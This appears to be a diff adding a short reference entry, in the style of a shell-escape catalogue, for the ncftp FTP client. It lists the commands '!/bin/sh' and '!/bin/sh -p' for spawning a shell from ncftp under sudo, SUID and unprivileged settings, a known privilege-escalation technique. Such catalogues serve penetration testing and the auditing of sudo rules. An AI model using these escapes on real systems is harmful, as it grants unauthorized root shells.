@@ -1,0 +1,17 @@
+ncftp
+=====
+
+Shell
+-----
+
+[Sudo]
+    ncftp
+!/bin/sh
+
+[SUID]
+    ncftp
+!/bin/sh -p
+
+[Unprivileged]
+    ncftp
+!/bin/sh
